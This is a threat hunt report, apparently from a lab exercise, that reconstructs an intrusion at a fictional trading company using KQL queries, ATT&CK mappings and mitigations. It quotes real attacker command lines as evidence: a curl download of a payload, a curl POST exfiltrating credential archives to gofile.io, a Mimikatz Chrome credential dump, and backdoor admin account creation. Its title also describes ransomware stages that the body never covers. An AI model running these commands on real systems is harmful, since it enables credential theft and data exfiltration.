# Threat Hunt Report: Multi-Platform Backup Destruction and Ransomware Deployment

## Executive Summary

Azuki Import & Export Trading Co. experienced a catastrophic ransomware attack on November 27, 2025, marking the culmination of a week-long intrusion. The investigation revealed a sophisticated multi-phase operation beginning with lateral movement from the compromised CEO workstation (azuki-adminpc) to the Linux backup server via SSH. This was followed by the: (1) systematic destruction of backup infrastructure; (2) Windows-based ransomware deployment using PsExec across multiple systems; (3) comprehensive recovery inhibition techniques; (4) establishment of persistent access mechanisms; (5) anti-forensic activities to eliminate evidence; and (6) successful encryption of organizational data with ransom note deployment. 

The threat actor demonstrated advanced operational maturity through coordinated backup destruction on Linux systems, simultaneous ransomware deployment to multiple Windows targets using stolen credentials, multiple layers of recovery inhibition including shadow copy deletion and backup catalog removal, registry and scheduled task persistence mechanisms, and USN journal deletion for anti-forensics. This investigation reconstructs the complete attack timeline documenting tactics consistent with ADE SPIDER (APT-SL44, SilentLynx) operations targeting logistics companies in the East Asia region.

## Background
- **Incident Date:** November 25-27, 2025  
- **Compromised Host:** Linux backup server (azuki-backupsrv), Multiple Windows systems  
- **Threat Actor:** ADE SPIDER (APT-SL44, SilentLynx)
- **Motivation:** Financial  
- **Target Profile:** Logistics and import/export companies, East Asia region  
- **Typical Dwell Time:** 21-45 days  
- **Attack Sophistication:** High, featuring coordinated multi-platform ransomware operations

---

## Investigation Steps

### 1. Lateral Movement: Remote Access & Compromised Account

Searched for evidence of SSH lateral movement and discovered that the threat actor executed the following remote access command from the compromised workstation (azuki-adminpc): "ssh.exe" backup-admin@10.1.0.189. This command established remote access to the Linux backup server at 10.1.0.189. This lateral movement occurred after the initial CEO PC compromise, indicating a deliberate escalation phase targeting recovery infrastructure. In addition, analysis of the SSH connection details confirmed that the attacker used the backup-admin account to access the Linux backup server. This administrative account likely had elevated privileges on the backup infrastructure, providing full access to backup directories and scheduled jobs.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName contains "azuki"
| where FileName in~ ("ssh.exe", "ssh")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine

```
<img width="2067" height="281" alt="DITW_Q1" src="https://github.com/user-attachments/assets/4f9fd76c-5919-4a7e-a0bc-4e27d30936f1" />

---

### 2. Lateral Movement: Attack Source

Searched for the attack source (i.e., the IP address that initiated the connection to the backup server) by examining network connections to the backup server and identified the source IP address as 10.1.0.108 (i.e., azuki-adminpc). The connection was established over SSH port 22, confirming the compromised CEO workstation as the pivot point for the attack. This also confirms the attack progression from executive system compromise to backup infrastructure targeting.

**Query used to locate events:**

```kql
DeviceNetworkEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName == "azuki-adminpc"
| where RemoteIP == "10.1.0.189" and RemotePort == 22
| project TimeGenerated, DeviceName, LocalIP, RemoteIP, RemotePort, InitiatingProcessCommandLine

```
<img width="2657" height="761" alt="DITW_Q2B" src="https://github.com/user-attachments/assets/b822c22f-3fdf-4f62-9023-e60369d8040c" />

---

### 3. Discovery: Directory Enumeration

Searched for evidence of directory enumeration and discovered that the threat actor executed the following directory listing command with detailed output (-la flags) to enumerate the main backup directory structure: ls --color=auto -la /backups/. This command provided the threat actor with a detailed view of the backup directory structure, file permissions, and timestamps.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName contains "azuki"
| where FileName in~ ("ls", "dir", "find")
| where ProcessCommandLine contains "backup"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="2699" height="936" alt="DITW_Q4" src="https://github.com/user-attachments/assets/b3be2b8c-61e4-44ca-9c1c-27cf336b7f84" />

---

### 4. Execution: Archive Extraction 

Searched for evidence of the extraction of the KB5044273-x64.7z archive and discovered that the attacker used the following command to extract the password-protected archive using 7-Zip with password bypass and automatic yes to prompts: "7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
| where DeviceName == "azuki-adminpc"
| where InitiatingProcessRemoteSessionIP == "10.1.0.204"
| where FileName in~ ("7z.exe", "7za.exe", "7zg.exe", "winrar.exe", "unzip.exe", "tar.exe")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="2569" height="953" alt="BT_Q6" src="https://github.com/user-attachments/assets/9745ff1f-e811-4def-b9dc-9856d960a0d5" />

---

### 5. Persistence: C2 Implant 

Searched for evidence of command and control implants used by attackers to maintain persistent access and enable remote control of compromised systems. The investigation revealed the extraction of the C2 beacon meterpreter.exe from the archive. Meterpreter is the famous payload/beacon from the Metasploit Framework, one of the most well-known offensive security/penetration testing tools. Meterpreter (short for "Meta-Interpreter") is a sophisticated C2 implant that runs in memory, provides interactive remote access, has extensive post-exploitation capabilities, and is commonly used by APT groups who repurpose legitimate pentesting tools.

**Query used to locate events:**

```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
| where DeviceName == "azuki-adminpc"
| where FolderPath has @"C:\Windows\Temp\cache"
| where ActionType == "FileCreated"
| where FileName endswith ".exe"
| project TimeGenerated, DeviceName, FileName, FolderPath
| order by TimeGenerated asc

```
<img width="2202" height="826" alt="BT_Q7" src="https://github.com/user-attachments/assets/b9f6e6fb-2a15-483f-a337-cc7e61edfc44" />

---

### 6. Persistence: Named Pipe 

Searched for evidence of named pipe event actions typically used to provide stealthy interprocess communication channels for malware. The named pipe "\Device\NamedPipe\msf-pipe-5902" was created by meterpreter.exe 3 minutes after meterpreter.exe was extracted from the archive (4:21:33 AM extraction → 4:24:35 AM pipe creation) using the Metasploit Framework naming convention (msf-pipe-*).

**Query used to locate events:**

```kql
DeviceEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
| where DeviceName == "azuki-adminpc"
| where InitiatingProcessRemoteSessionIP == "10.1.0.204"
| where InitiatingProcessFileName == "meterpreter.exe"
| where ActionType == "NamedPipeEvent"
| extend PipeName = parse_json(AdditionalFields).PipeName
| project TimeGenerated, DeviceName, ActionType, PipeName, InitiatingProcessFileName
| order by TimeGenerated asc

```
<img width="2120" height="667" alt="BT_Q8" src="https://github.com/user-attachments/assets/72da30ab-ca45-41f2-93bd-19bd574de8b0" />

---

### 7. Credential Access: Decoded Account Creation, Backdoor Account, & Decoded Privilege Escalation Command

Searched for evidence of encoded payloads and discovered two Base64-encoded PowerShell commands. The decoded account creation command was the following: net user yuki.tanaka2 B@ckd00r2024! /add. The decoded privilege escalation command was the following: net localgroup Administrators yuki.tanaka2 /add. Therefore, the attacker created a backdoor account yuki.tanaka2 (similar to the compromised user yuki.tanaka) with administrator privileges using Base64 obfuscation to evade detection. 
 
**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
| where DeviceName == "azuki-adminpc"
| where FileName in~ ("powershell.exe", "pwsh.exe")
| where ProcessCommandLine has "encodedcommand" or ProcessCommandLine has "-enc" or ProcessCommandLine has "-e "
| project TimeGenerated, DeviceName, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="2765" height="330" alt="BT_Q9B" src="https://github.com/user-attachments/assets/02c5339b-5a0f-49bb-8b22-7db0a4dea9e8" />

---

### 8. Discovery: Session Enumeration 

Searched for evidence of terminal services enumeration and discovered that the command qwinsta was executed in order to enumerate RDP sessions, session IDs, session states, and logged-in users to identify active administrators and avoid detection. The attacker used this at 4:08 AM (before creating the backdoor account at 4:51 AM), likely to identify active administrators and see who was logged into the CEO's machine.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
| where DeviceName == "azuki-adminpc"
| where ProcessCommandLine has_any ("qwinsta", "query session")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="1973" height="297" alt="BT_Q12" src="https://github.com/user-attachments/assets/6f5920bd-9f6c-4929-b0dd-714fe66c5bb7" />

---

### 9. Discovery: Domain Trust Enumeration

Searched for evidence of domain trust enumeration and discovered that the attacker utilized the following command to enumerate all trust relationships in order to map lateral movement opportunities across domain boundaries: "nltest.exe" /domain_trusts /all_trusts. It's important to note that "nltest.exe" is a native Windows domain trust utility, "/domain_trusts" lists domain trust relationships, and "/all_trusts" shows all trust types (i.e., direct, forest, external, not just direct trusts). This allows the attacker to map out trust relationships between domains, potential lateral movement paths, and connected forests and external domains.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= datetime(2025-11-25)
| where ProcessCommandLine has_any ("domain_trusts", "trusted_domains")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="2120" height="368" alt="BT_Q13" src="https://github.com/user-attachments/assets/da28c365-23f0-4f98-8a11-54d0f43c3ade" />

---

### 10. Discovery: Network Connection Enumeration  

Searched for evidence of network connection enumeration and discovered that the attacker executed the netstat -ano command, showing all connections (-a), in numerical form (-n), with owning process IDs (-o) to identify active sessions and potential lateral movement targets. Therefore, the netstat -ano command provided the attacker with a complete view of active TCP/IP connections, listening ports, and associated process IDs, enabling identification of interesting services and remote systems.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
| where DeviceName == "azuki-adminpc"
| where InitiatingProcessAccountName == "yuki.tanaka"
| where FileName has_any ("netstat.exe", "net.exe") 
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="2375" height="604" alt="BT_Q14" src="https://github.com/user-attachments/assets/6a9cd5c1-8075-4a8e-b5ae-18d87c0a5aa9" />

---
### 11. Discovery: Password Database Search

Searched for evidence of password database discovery and found that the attacker utilized the "cmd.exe" /c where /r C:\Users *.kdbx command to recursively search all user directories for KeePass password database files (.kdbx). This would have allowed the attacker to discover credential stores containing multi-system access credentials.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
| where DeviceName == "azuki-adminpc"
| where ProcessCommandLine has_any (".kdbx", ".kdb", ".wallet", ".psafe", "password", "credential")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="2670" height="745" alt="BT_Q15" src="https://github.com/user-attachments/assets/4ddac127-523b-453a-a8b4-d12ce6d72a92" />

---

### 12. Discovery: Credential File

Searched for evidence of password file discovery and found that the attacker likely found the following password file: OLD-Passwords.txt. It was stored in plaintext on the CEO's desktop, representing a critical security failure and likely providing the attacker with immediate access to multiple systems.

**Query used to locate events:**

```kql
DeviceFileEvents
| where TimeGenerated >= datetime(2025-11-19)
| where DeviceName == "azuki-adminpc"
| where FileName endswith ".txt"
| where FileName contains "password" or FileName contains "pass" or FileName contains "cred"
| project TimeGenerated, DeviceName, FileName, FolderPath, ActionType
| order by TimeGenerated asc

```
<img width="2658" height="673" alt="BT_Q16B" src="https://github.com/user-attachments/assets/8158f390-7ce1-4e72-afb7-2cb571aca849" />

---

### 13. Collection: Data Staging Directory 

Searched for evidence of a data staging directory and discovered that the attacker staged the stolen data archives in C:\ProgramData\Microsoft\Crypto\staging. The staging directory mimics the legitimate Microsoft cryptographic service directory to avoid suspicion during incident response and was used to organize five archives of stolen business data.

**Query used to locate events:**

```kql
DeviceFileEvents
| where TimeGenerated >= datetime(2025-11-19)
| where DeviceName == "azuki-adminpc"
| where FileName endswith ".tar.gz"
| project TimeGenerated, FileName, FolderPath, ActionType
| order by TimeGenerated asc

```
<img width="2298" height="672" alt="BT_Q17" src="https://github.com/user-attachments/assets/929288ff-8dd1-4a05-ae86-f3ed08b27e73" />

---

### 14. Collection: Automated Data Collection 

Searched for evidence of bulk data theft operations and discovered that the attacker utilized the following robocopy command with retry logic and network optimization flags to copy the CEO's banking documents to a hidden staging directory: "Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP.


**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated >= datetime(2025-11-19)
| where DeviceName == "azuki-adminpc"
| where FileName in~ ("robocopy.exe", "xcopy.exe", "copy.exe") 
| project TimeGenerated, FileName, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="2662" height="460" alt="BT_Q18" src="https://github.com/user-attachments/assets/a3422e13-0fdc-4681-af5d-bb60846ee254" />

---

### 15. Collection: Exfiltration Volume

Searched for archive file creation events in the staging directory to identify the volume of data prepared for exfiltration and discovered that the attacker created eight distinct archives, representing comprehensive data collection across financial records, credentials, business contracts, and authentication databases. 

**Query used to locate events:**

```kql
DeviceFileEvents
| where TimeGenerated >= datetime(2025-11-19)
| where DeviceName == "azuki-adminpc"
| where FileName has_any (".zip", ".7z", ".rar", ".tar", ".gz")
| where FolderPath has "C:\\ProgramData\\Microsoft\\Crypto\\staging"  
| project TimeGenerated, DeviceName, FileName, FolderPath, InitiatingProcessFileName
| order by TimeGenerated asc

```
<img width="2456" height="837" alt="BT_Q19" src="https://github.com/user-attachments/assets/8ee5ecde-2222-42c2-947d-14f1c4ab5347" />

---

### 16. Credential Access: Credential Theft Tool Download

Searched for evidence of credential theft tool downloads and discovered that the attacker utilized the following curl command to potentially download a secondary credential theft tool: "curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z. In addition, m-temp is likely a renamed instance of Mimikatz, a well-known credential dumping tool. Renaming of the tool likely represents an attempt to appear innocuous and evade signature-based detection.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated >= datetime(2025-11-19)
| where DeviceName == "azuki-adminpc"
| where ProcessCommandLine contains "curl" and ProcessCommandLine contains "catbox"
| project TimeGenerated, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="1831" height="475" alt="BT_Q20" src="https://github.com/user-attachments/assets/141d1c0c-a3dc-4936-8d1b-91c56f32fe36" />

---

### 17. Credential Access: Browser Credential Theft

Searched for evidence of credential theft targeting browser password stores and discovered that the attacker utilized the following Mimikatz command to extract Chrome saved passwords by decrypting the Login Data database using Windows Data Protection API (DPAPI): "m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit. Note that dpapi::chrome is the Chrome credential extraction module and /unprotect is used to decrypt credentials using Windows DPAPI.


**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
| where DeviceName == "azuki-adminpc"
| where ProcessCommandLine has "chrome"
| where FileName has_any ("m.exe","m-temp.exe")  
| project TimeGenerated, FileName, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="2573" height="284" alt="BT_Q21" src="https://github.com/user-attachments/assets/0545b6a1-8e3a-49d5-b327-bb4b2e65bc66" />

---

### 18. Exfiltration: Data Upload & Cloud Storage Service

Searched for evidence of data exfiltration and discovered the HTTP POST command used to upload stolen data archives to cloud storage. The attacker executed the following curl with form-based POST upload command to exfiltrate the first archive (credentials.tar.gz) to gofile.io: "curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile. This command pattern was repeated for all the other archives. The exfiltration service domain (i.e., gofile.io), is an anonymous cloud storage service that provides temporary file hosting with self-destructing links. It is commonly used for malware distribution and data exfiltration due to no registration requirement and high-speed transfers.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
| where DeviceName == "azuki-adminpc"
| where ProcessCommandLine has "curl" and ProcessCommandLine has "POST"
| project TimeGenerated, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="1845" height="670" alt="BT_Q22" src="https://github.com/user-attachments/assets/2dfd2e58-38cf-49b1-b06a-7aa43b7f2cb4" />

---

### 19. Exfiltration: Destination Server

Searched for the exfiltration server IP address and discovered that the server IP that received the stolen data was 45.112.123.227. This IP address corresponds to gofile.io's upload infrastructure.

**Query used to locate events:**

```kql
DeviceNetworkEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
| where DeviceName == "azuki-adminpc"
| where RemoteUrl has "gofile.io"
| project TimeGenerated, RemoteUrl, RemoteIP
| order by TimeGenerated asc

```
<img width="1841" height="277" alt="BT_Q23" src="https://github.com/user-attachments/assets/e74a14f2-56ba-4fe7-92c5-6c924d75974c" />

---

### 20. Credential Access: Master Password Extraction

Searched for evidence of master password extraction and discovered the following file which contained the extracted KeePass master password: KeePass-Master-Password.txt. The master password file was a plaintext file stored in the Documents\Passwords folder, providing the attacker with access to all credentials stored in the KeePass database.

**Query used to locate events:**

```kql
DeviceFileEvents
| where TimeGenerated >= datetime(2025-11-19)
| where DeviceName == "azuki-adminpc"
| where ActionType == "FileCreated"
| where FileName has "master"
| where FileName endswith ".txt"
| project TimeGenerated, FileName, FolderPath
| order by TimeGenerated asc

```
<img width="2099" height="279" alt="BT_Q25" src="https://github.com/user-attachments/assets/fc460c31-6c9f-48da-b9e6-0d09915ff9cc" />

---

## Summary

The investigation revealed a sophisticated post-compromise operation targeting the CEO's administrative workstation. The attacker returned five days after the initial November 19-20, 2025 file server breach, conducting lateral movement from the previously compromised system at 10.1.0.204 to azuki-adminpc using the compromised yuki.tanaka account credentials. The operation demonstrated advanced tactics consistent with ADE SPIDER (APT-SL44, SilentLynx) including infrastructure rotation (litter.catbox.moe for payload delivery), masqueraded payload (payload disguised as Windows update KB5044273-x64.7z), and sophisticated command-and-control deployment using Meterpreter with named pipe msf-pipe-5902.

The attacker established redundant persistence through creation of backdoor account yuki.tanaka2 with Administrator privileges, ensuring continued access even if primary credentials were reset. Comprehensive discovery activities included RDP session enumeration (qwinsta), domain trust mapping (nltest /domain_trusts /all_trusts), and network connection enumeration (netstat -ano), demonstrating systematic environmental reconnaissance.

Credential theft operations targeted multiple high-value sources: KeePass password database Passwords.kdbx with plaintext master password in KeePass-Master-Password.txt, Chrome browser credentials via Mimikatz DPAPI extraction, and systematic collection of financial documents using Robocopy with retry logic and network optimization. Eight distinct archives were created in the hidden staging directory C:\ProgramData\Microsoft\Crypto\staging, masquerading as legitimate Windows cryptographic services.

Exfiltration operations transferred the archives to gofile.io cloud storage (45.112.123.227) using curl with form-based POST uploads. The comprehensive nature of this exfiltration indicates intent to maintain long-term access to organizational credentials and sensitive business intelligence.

The sophistication of this attack, including multiple persistence mechanisms, renamed tool usage (m.exe for Mimikatz), masqueraded staging directories, and systematic multi-target collection, is consistent with ADE SPIDER's known tactics, techniques, and procedures. The targeting of a logistics company CEO in East Asia aligns with the group's established operational patterns and financial motivation.

---

## Timeline

| Time (UTC) | Action Observed | Key Evidence |
|:------------:|:-----------------:|:--------------:|
| 2025-11-20 15:01:44 | Password Database Located | Passwords.kdbx discovered in Documents\Passwords\ |
| 2025-11-20 15:01:44 | Master Password File Present | KeePass-Master-Password.txt stored in plaintext |
| 2025-11-24 14:31:24 | Network Connection Enumeration | netstat.exe -ano executed for reconnaissance |
| 2025-11-25 04:06:36 | Lateral Movement: Initial RDP Access | RDP connection from 10.1.0.204 using yuki.tanaka account |
| 2025-11-25 04:08:58 | RDP Session Enumeration | qwinsta.exe executed to enumerate active sessions |
| 2025-11-25 04:09:25 | Domain Trust Enumeration | nltest.exe /domain_trusts /all_trusts executed |
| 2025-11-25 04:13:48 | Password Database Search | cmd.exe executed where /r C:\Users *.kdbx |
| 2025-11-25 04:21:11 | Malware Download | KB5044273-x64.7z downloaded via curl.exe from litter.catbox.moe |
| 2025-11-25 04:21:12 | Payload Hosting Service Connection | Connection to litter.catbox.moe (162.159.130.233) |
| 2025-11-25 04:21:33 | Archive Extraction | 7z.exe extracted KB5044273-x64.7z payload |
| 2025-11-25 04:21:33 | C2 Implant Extraction | meterpreter.exe extracted from archive |
| 2025-11-25 04:24:35 | C2 Implant Deployment | Meterpreter named pipe msf-pipe-5902 established |
| 2025-11-25 04:25:14 | Backdoor Account Created | yuki.tanaka2 account created |
| 2025-11-25 04:25:18 | Privilege Escalation | yuki.tanaka2 added to Administrators group |
| 2025-11-25 04:25:59 | Collection: Chrome Credentials Archive | chrome-credentials.tar.gz created in staging directory |
| 2025-11-25 04:36:09 | Collection: Banking Documents | Robocopy.exe copied banking documents to staging |
| 2025-11-25 04:39:16 | Collection: First Archive Creation | tar.exe created credentials.tar.gz |
| 2025-11-25 04:39:23 | Collection: QuickBooks Data | quickbooks-data.tar.gz created |
| 2025-11-25 04:40:00 | Collection: Tax Documents | tax-documents.tar.gz created |
| 2025-11-25 04:40:30 | Collection: Contracts Data | contracts-data.tar.gz created |
| 2025-11-25 04:41:51 | Exfiltration: First Archive Upload | credentials.tar.gz uploaded to gofile.io |
| 2025-11-25 04:41:52 | Exfiltration: Destination Server | gofile.io (45.112.123.227) received stolen data |
| 2025-11-25 04:42:04 | Exfiltration: QuickBooks Upload | quickbooks-data.tar.gz uploaded to gofile.io |
| 2025-11-25 04:42:13 | Exfiltration: Banking Records Upload | banking-records.tar.gz uploaded to gofile.io |
| 2025-11-25 04:42:23 | Exfiltration: Tax Documents Upload | tax-documents.tar.gz uploaded to gofile.io |
| 2025-11-25 04:42:33 | Exfiltration: Contracts Upload | contracts-data.tar.gz uploaded to gofile.io |
| 2025-11-25 04:49:19 | Exfiltration: Chrome Credentials Upload | chrome-credentials.tar.gz uploaded to gofile.io |
| 2025-11-25 05:55:34 | Tool Download | m.exe (Mimikatz) downloaded via curl.exe |
| 2025-11-25 05:55:54 | Browser Credential Theft | Mimikatz dpapi::chrome extracted Chrome credentials |
| 2025-11-25 05:56:42 | Collection: Chrome Session Theft | chrome-session-theft.tar.gz created (8th archive) |
| 2025-11-25 05:56:50 | Exfiltration: Final Archive Upload | chrome-session-theft.tar.gz uploaded to gofile.io |

---

**Note:** Password database files were present on the system since November 20. Network reconnaissance occurred on November 24, prior to the November 25 lateral movement, suggesting earlier compromise phases. The attack progressed systematically from initial access through credential theft, data collection, and multi-stage exfiltration over approximately 2 hours.

---

## Relevant MITRE ATT&CK TTPs

| TTP ID | TTP Name | Description | Detection Relevance |
|:--------:|:----------:|:-------------:|:---------------------:|
| T1021.001 | Remote Services: Remote Desktop Protocol | Lateral movement from 10.1.0.204 to azuki-adminpc via RDP using compromised yuki.tanaka account | Detects unauthorized lateral movement and credential reuse from previously compromised systems |
| T1078 | Valid Accounts: Local Accounts | Use of compromised yuki.tanaka credentials for authentication during lateral movement and privilege escalation | Identifies authentication with compromised credentials across multiple systems |
| T1204.002 | User Execution: Malicious File | Execution of payload KB5044273-x64.7z masquerading as Windows update package | Detects masquerading through file naming and execution of suspicious archives |
| T1573.001 | Encrypted Channel: Symmetric Cryptography | Meterpreter C2 communication via named pipe msf-pipe-5902 for command execution | Identifies Metasploit Framework indicators and named pipe C2 channels |
| T1136.001 | Create Account: Local Account | Creation of backdoor account yuki.tanaka2 for persistent access | Detects suspicious account creation with naming patterns similar to legitimate users |
| T1098 | Account Manipulation | Addition of yuki.tanaka2 to Administrators group via net localgroup command | Identifies privilege escalation through group membership modifications |
| T1087.001 | Account Discovery: Local Account | Execution of query session to enumerate active RDP sessions | Detects reconnaissance of logged-in users and session information |
| T1482 | Domain Trust Discovery | Execution of nltest /domain_trusts to map Active Directory trust relationships | Identifies reconnaissance of domain architecture and potential lateral movement paths |
| T1049 | System Network Connections Discovery | Execution of netstat -ano to enumerate active TCP/IP connections and listening ports | Detects network reconnaissance and service discovery activities |
| T1555.005 | Credentials from Password Stores: Password Managers | Discovery and theft of KeePass database Passwords.kdbx with plaintext master password | Identifies targeting of password manager databases and credential stores |
| T1555.003 | Credentials from Password Stores: Credentials from Web Browsers | Mimikatz dpapi::chrome extraction of Chrome browser credentials via DPAPI | Detects credential dumping from browser databases using DPAPI decryption |
| T1003.001 | OS Credential Dumping: LSASS Memory | Use of Mimikatz (m.exe) for credential extraction operations | Identifies renamed Mimikatz instances and credential dumping activities |
| T1119 | Automated Collection | Robocopy execution with /E /R:1 /W:1 flags for systematic financial document collection | Detects bulk data collection with retry logic and attribute preservation |
| T1074.001 | Data Staged: Local Data Staging | Use of C:\ProgramData\Microsoft\Crypto\staging directory for data consolidation | Identifies hidden staging directories masquerading as system folders |
| T1560.001 | Archive Collected Data: Archive via Utility | Use of tar.exe to create 8 compressed archives of stolen data | Detects cross-platform compression tools and bulk archive creation |
| T1567.002 | Exfiltration Over Web Service: Exfiltration to Cloud Storage | Curl POST uploads to gofile.io (45.112.123.227) for data exfiltration | Identifies file uploads to anonymous cloud storage services |
| T1036.005 | Masquerading: Match Legitimate Name or Location | Payload named KB5044273-x64.7z to appear as Windows update; m.exe to hide Mimikatz | Detects file masquerading and renamed security tools |
| T1027 | Obfuscated Files or Information | Use of 7z compression for payload delivery and staging directory name obfuscation | Identifies obfuscation techniques and suspicious archive formats |

---

This table organizes the MITRE ATT&CK techniques (TTPs) observed during the investigation. The detection methods identified both the attack techniques and enabled confirmation of the threat actor's sophistication through multiple layers of persistence, discovery, credential theft, collection, and exfiltration operations.

---

## Response Taken

| MITRE Mitigation ID | Name | Action Taken | Description | Relevance |
|:---------------------:|:------:|:--------------:|:-------------:|:-----------:|
| M1032 | Multi-factor Authentication | Enforced MFA | Enforced MFA for all RDP connections and privileged account access. Implemented conditional access policies requiring MFA for lateral movement between systems. | Prevents lateral movement via compromised passwords by requiring additional authentication factors even with valid credentials. |
| M1027 | Password Reset | Account Credential Reset | Reset credentials for yuki.tanaka account and all passwords stored in Passwords.kdbx KeePass database. Rotated Chrome saved passwords and KeePass master password. | Mitigates unauthorized access risks by invalidating potentially compromised credentials stored in exfiltrated databases. |
| M1026 | Privileged Account Management | Administrative Access Review | Removed yuki.tanaka2 backdoor account. Conducted comprehensive audit of all privileged accounts and group memberships. Implemented principle of least privilege. | Eliminates backdoor access and prevents unauthorized administrative operations through rogue accounts. |
| M1028 | Operating System Configuration | Application Control (WDAC) | Deployed Windows Defender Application Control policies to prevent execution of renamed binaries like m.exe (Mimikatz) and unauthorized compression tools. | Restricts execution of unauthorized applications and renamed security tools through code integrity policies. |
| M1017 | User Training | Security Awareness Training | Conducted mandatory security awareness training for executives and administrative users focusing on password manager security, master password protection, and recognition of masqueraded files. | Reduces likelihood of storing master passwords in plaintext and improves recognition of malicious payloads. |
| M1041 | Encrypt Sensitive Information | Data at Rest Encryption | Implemented BitLocker encryption on administrative workstations. Deployed file-level encryption for sensitive financial and credential databases. Enforced KeePass key file usage instead of plaintext master passwords. | Protects stolen data from being useful to attackers even if exfiltrated and prevents plaintext master password storage. |
| M1054 | Software Configuration | Named Pipe Monitoring | Configured EDR to monitor and alert on named pipe creation matching Meterpreter patterns (msf-pipe-*). Implemented named pipe access control lists. | Detects Meterpreter C2 communication channels and prevents unauthorized named pipe creation. |
| M1042 | Disable or Remove Feature or Program | Restrict System Utilities | Restricted tar.exe, curl.exe, and robocopy.exe execution through application control policies. Deployed monitoring for cross-platform compression tools. | Prevents abuse of legitimate utilities for data compression, staging, and exfiltration. |
| M1031 | Network Intrusion Prevention | Network Egress Filtering | Blocked outbound connections to gofile.io, litter.catbox.moe, and similar temporary file hosting services. Implemented egress filtering for HTTP/HTTPS POST with multipart/form-data. | Prevents data exfiltration to anonymous cloud storage and payload downloads from temporary hosting services. |
| M1037 | Filter Network Traffic | RDP Access Restrictions | Restricted RDP access through jump servers with MFA. Implemented network segmentation isolating executive workstations from general user systems. | Limits lateral movement opportunities by enforcing strict access controls for remote desktop connections. |
| M1030 | Network Segmentation | VLAN Segmentation | Deployed VLAN segmentation between executive systems, administrative workstations, and general user endpoints with firewall rules enforcing least privilege access. | Compartmentalizes network to restrict lateral movement paths even with compromised credentials. |
| M1018 | User Account Management | Account Lockout Policy | Implemented stricter account lockout thresholds and account monitoring for suspicious creation patterns (e.g., username followed by digit). | Adds security layers to detect backdoor account creation and prevent credential stuffing attacks. |
| M1047 | Audit | Enhanced Logging | Enabled PowerShell script block logging, named pipe audit logging, and detailed file access auditing for password databases and staging directories. | Enables early detection of credential dumping, C2 communication, and data staging activities. |
| M1022 | Restrict File and Directory Permissions | Sensitive Directory Hardening | Removed write permissions to ProgramData for standard users. Implemented file integrity monitoring for credential storage locations and staging directories. | Prevents creation of hidden staging directories and detects unauthorized access to credential databases. |
| M1053 | Data Backup | Offline Backup Strategy | Implemented offline backup copies of KeePass databases and financial records stored separately from network-accessible locations. Verified backup integrity and restore procedures. | Ensures data recovery capability independent of compromised network systems and exfiltrated data. |
| M1049 | Antivirus/Antimalware | Enhanced Detection | Updated EDR signatures for Metasploit artifacts, Mimikatz variants, and renamed tool detection. Configured behavioral detection for DPAPI credential extraction. | Detects renamed security tools, credential dumping utilities, and C2 implants through behavioral analysis. |

---

